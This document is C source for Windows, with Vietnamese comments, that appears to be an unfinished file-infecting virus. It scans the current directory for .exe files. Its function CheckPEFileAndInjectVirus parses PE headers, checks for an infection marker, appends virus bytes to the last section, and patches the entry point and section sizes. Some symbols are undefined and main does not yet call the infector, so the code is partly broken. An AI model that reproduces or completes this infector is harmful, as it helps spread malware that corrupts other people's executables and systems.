#include <windows.h>
#include <string.h>
#include <stdio.h>

// Định nghĩa kiểu cho hàm findAPI
typedef void (*FindAPI)(DWORD hash, const char *functionName, void **functionAddress);

/*
// Get Function Address from Kernell: kernel32FunctionsAddress, kernel32FunctionsHash
void GetFunctionAddress(const char *functionName, DWORD functionHash, void **functionAddress) {
    // Lấy địa chỉ của PEB
    PEB *peb = (PEB *)__readfsdword(0x30);
    LDR_DATA_TABLE_ENTRY *moduleEntry = (LDR_DATA_TABLE_ENTRY *)peb->Ldr->InInitializationOrderModuleList.Flink;

    // Bỏ qua đến mục kernel32.dll
    for (int i = 0; i < 2; ++i) {
        moduleEntry = (LDR_DATA_TABLE_ENTRY *)moduleEntry->Flink;
    }

    // Lấy địa chỉ cơ sở của kernel32.dll
    HMODULE kernel32BaseAddress = (HMODULE)moduleEntry->DllBase;

    // Gọi hàm findAPI
    FindAPI findAPI = (FindAPI)GetProcAddress(kernel32BaseAddress, "findAPI");
    if (findAPI) {
        findAPI(functionHash, functionName, functionAddress);
    }
}
*/

// Get Function Address from User32.dll: user32FunctionsAddress, user32FunctionsHash
void GetFunctionAddressFromUser32(const char *functionName, DWORD functionHash, void **functionAddress) {
    HMODULE user32Module = NULL;

    // Tải user32.dll
    user32Module = LoadLibrary("user32.dll");
    if (user32Module == NULL) {
        // Xử lý lỗi nếu không tải được user32.dll
        return;
    }

    // Gọi hàm findAPI để tìm hàm trong user32.dll
    FindAPI findAPI = (FindAPI)GetProcAddress(user32Module, "findAPI");
    if (findAPI) {
        findAPI(functionHash, functionName, functionAddress);
    }
}

// Hàm để hiển thị MessageBox - DONE
void ShowMessageBox(const char *title, const char *content) {
    MessageBoxA(NULL, content, title, MB_OK);
}


// Hàm TEST để ghi dữ liệu vào tệp - DONE
void WriteToFile(const char *directory, const char *fileName, const char *data, size_t dataSize) {
    char fullPath[MAX_PATH];
    HANDLE hFile;
    DWORD written;
    // Kết hợp thư mục với tên tệp để tạo đường dẫn đầy đủ
    // Đảm bảo đường dẫn thư mục kết thúc bằng '\\'
    strcpy(fullPath, directory);
    size_t len = strlen(fullPath);
    if (fullPath[len - 1] != '\\') {
        strcat(fullPath, "\\");
    }
    strcat(fullPath, fileName);
    hFile = CreateFileA(fullPath,
                        GENERIC_READ | GENERIC_WRITE,
                        FILE_SHARE_READ,
                        NULL,
                        CREATE_ALWAYS,
                        FILE_ATTRIBUTE_NORMAL,
                        NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        return;
    }
    WriteFile(hFile, data, (DWORD)dataSize, &written, NULL);
    CloseHandle(hFile);
}


//Scan cac tep trong thu muc hien tai - DONE
void FindAndOpenPEFiles(const char *pathExten) {
    WIN32_FIND_DATAA findFileData;
    HANDLE hFindFile;
    char pathFile[MAX_PATH];
    char searchPath[MAX_PATH];
    char fullPath[MAX_PATH];
    HANDLE hFile;

    // Lấy thư mục hiện tại
    GetCurrentDirectoryA(MAX_PATH, pathFile);

    // Tạo đường dẫn tìm kiếm
    strcpy(searchPath, pathFile);
    strcat(searchPath, "\\");
    strcat(searchPath, pathExten);

    // Tìm tệp đầu tiên
    hFindFile = FindFirstFileA(searchPath, &findFileData);
    if (hFindFile == INVALID_HANDLE_VALUE) {
        // Xử lý lỗi nếu không thể tìm tệp
        printf("Khong the tim tep.\n");
        return;
    }

    do {
        // Kiểm tra nếu không phải tệp PE (tệp không phải là thư mục)
        if ((findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0) {
            // Tạo đường dẫn đầy đủ cho tệp (chỉ cần pathFile và tên tệp, không cần phần mở rộng tìm kiếm)
            strcpy(fullPath, pathFile);
            strcat(fullPath, "\\");
            strcat(fullPath, findFileData.cFileName);

            // Mở tệp
            hFile = CreateFileA(fullPath,
                                GENERIC_READ | GENERIC_WRITE,
                                FILE_SHARE_READ,
                                NULL,
                                OPEN_EXISTING,
                                FILE_ATTRIBUTE_NORMAL,
                                NULL);

            if (hFile == INVALID_HANDLE_VALUE) {
                // Xử lý lỗi nếu không thể mở tệp
                printf("Khong the mo tep: %s\n", fullPath);
                continue;
            }

            // In thông báo đã tìm thấy tệp cùng với tên của tệp
            printf("Da mo tep: %s\n", findFileData.cFileName);

            // Đóng tệp
            CloseHandle(hFile);
        }
    } while (FindNextFileA(hFindFile, &findFileData) != 0);

    // Đóng handle tìm kiếm
    FindClose(hFindFile);
}


void CheckPEFileAndInjectVirus(HANDLE hFile) {
    DWORD bytesRead;
    WORD mzSignature;
    DWORD peSignatureAddress;
    DWORD peSignature;
    WORD optionalHeaderMagic;
    WORD numberOfSections;
    DWORD addressOfEntryPoint;
    DWORD imageBase;
    DWORD sectionAlignment;
    DWORD fileAlignment;
    DWORD virtualSize;
    DWORD virtualAddress;
    DWORD sizeOfRawData;
    DWORD pointerToRawData;
    DWORD sizeOfVirus;
    DWORD newEntryPoint;
    DWORD sizeOfImage;
    DWORD characteristics;
    DWORD lastSectionAddress;
    DWORD lastSectionOffset = 0;

    // Read 'MZ' signature
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    ReadFile(hFile, &mzSignature, sizeof(WORD), &bytesRead, NULL);
    if (mzSignature != 0x5A4D) { // 'MZ' signature
        CloseHandle(hFile);
        return;
    }

    // Read PE signature address (offset to PE signature)
    SetFilePointer(hFile, 0x3C, NULL, FILE_BEGIN);
    ReadFile(hFile, &peSignatureAddress, sizeof(DWORD), &bytesRead, NULL);

    // Read PE signature
    SetFilePointer(hFile, peSignatureAddress, NULL, FILE_BEGIN);
    ReadFile(hFile, &peSignature, sizeof(DWORD), &bytesRead, NULL);
    if (peSignature != 0x00004550) { // 'PE\0\0' signature
        CloseHandle(hFile);
        return;
    }

    // Read Optional Header Magic
    SetFilePointer(hFile, peSignatureAddress + 0x18, NULL, FILE_BEGIN);
    ReadFile(hFile, &optionalHeaderMagic, sizeof(WORD), &bytesRead, NULL);
    if (optionalHeaderMagic != 0x010B) { // PE32
        CloseHandle(hFile);
        return;
    }

    // Get NumberOfSections
    SetFilePointer(hFile, peSignatureAddress + 0x6, NULL, FILE_BEGIN);
    ReadFile(hFile, &numberOfSections, sizeof(WORD), &bytesRead, NULL);

    // Get AddressOfEntryPoint
    SetFilePointer(hFile, peSignatureAddress + 0x28, NULL, FILE_BEGIN);
    ReadFile(hFile, &addressOfEntryPoint, sizeof(DWORD), &bytesRead, NULL);

    // Get ImageBase
    SetFilePointer(hFile, peSignatureAddress + 0x34, NULL, FILE_BEGIN);
    ReadFile(hFile, &imageBase, sizeof(DWORD), &bytesRead, NULL);

    // Get SectionAlignment
    SetFilePointer(hFile, peSignatureAddress + 0x38, NULL, FILE_BEGIN);
    ReadFile(hFile, &sectionAlignment, sizeof(DWORD), &bytesRead, NULL);

    // Get FileAlignment
    SetFilePointer(hFile, peSignatureAddress + 0x3C, NULL, FILE_BEGIN);
    ReadFile(hFile, &fileAlignment, sizeof(DWORD), &bytesRead, NULL);

    // Calculate last section address
    lastSectionOffset = 0xF8 + 0x28 * (numberOfSections - 1);
    lastSectionAddress = peSignatureAddress + lastSectionOffset;

    // Get VirtualSize of the last section
    SetFilePointer(hFile, lastSectionAddress + 0x8, NULL, FILE_BEGIN);
    ReadFile(hFile, &virtualSize, sizeof(DWORD), &bytesRead, NULL);

    // Get VirtualAddress of the last section
    SetFilePointer(hFile, lastSectionAddress + 0xC, NULL, FILE_BEGIN);
    ReadFile(hFile, &virtualAddress, sizeof(DWORD), &bytesRead, NULL);

    // Get SizeOfRawData of the last section
    SetFilePointer(hFile, lastSectionAddress + 0x10, NULL, FILE_BEGIN);
    ReadFile(hFile, &sizeOfRawData, sizeof(DWORD), &bytesRead, NULL);

    // Get PointerToRawData of the last section
    SetFilePointer(hFile, lastSectionAddress + 0x14, NULL, FILE_BEGIN);
    ReadFile(hFile, &pointerToRawData, sizeof(DWORD), &bytesRead, NULL);

    // Calculate size of virus
    sizeOfVirus = (DWORD)&end_index - (DWORD)&start_index;

    // Check if file is already infected by looking for a specific value
    DWORD valueToCheck;
    SetFilePointer(hFile, pointerToRawData + virtualSize - sizeOfVirus, NULL, FILE_BEGIN);
    ReadFile(hFile, &valueToCheck, sizeof(DWORD), &bytesRead, NULL);
    if (valueToCheck == 0x7c0dfcaa) {
        CloseHandle(hFile);
        return;
    }

    // Inject the virus
    SetFilePointer(hFile, pointerToRawData + sizeOfRawData, NULL, FILE_BEGIN);
    WriteFile(hFile, (void*)&start_index, sizeOfVirus, &bytesRead, NULL);

    // Change the End_Script_Virus to jump to the original entry point
    DWORD endScriptOffset = sizeOfRawData + sizeOfVirus + ((DWORD)&End_Script_Virus - (DWORD)&start_index);
    SetFilePointer(hFile, endScriptOffset, NULL, FILE_BEGIN);
    WORD newOpcode = 0x90B8; // NOP MOV
    WriteFile(hFile, &newOpcode, sizeof(WORD), &bytesRead, NULL);

    // Update AddressOfEntryPoint
    addressOfEntryPoint += imageBase;
    SetFilePointer(hFile, peSignatureAddress + 0x28, NULL, FILE_BEGIN);
    WriteFile(hFile, &addressOfEntryPoint, sizeof(DWORD), &bytesRead, NULL);

    // Update VirtualSize
    virtualSize += sizeOfVirus;
    SetFilePointer(hFile, lastSectionAddress + 0x8, NULL, FILE_BEGIN);
    WriteFile(hFile, &virtualSize, sizeof(DWORD), &bytesRead, NULL);

    // Update SizeOfRawData
    sizeOfRawData += sizeOfVirus;
    SetFilePointer(hFile, lastSectionAddress + 0x10, NULL, FILE_BEGIN);
    WriteFile(hFile, &sizeOfRawData, sizeof(DWORD), &bytesRead, NULL);

    // Update SizeOfImage
    SetFilePointer(hFile, peSignatureAddress + 0x50, NULL, FILE_BEGIN);
    ReadFile(hFile, &sizeOfImage, sizeof(DWORD), &bytesRead, NULL);
    sizeOfImage += sizeOfVirus;
    SetFilePointer(hFile, peSignatureAddress + 0x50, NULL, FILE_BEGIN);
    WriteFile(hFile, &sizeOfImage, sizeof(DWORD), &bytesRead, NULL);

    CloseHandle(hFile);
}

int main() {
    FindAndOpenPEFiles("*.exe");
    return 0;
}

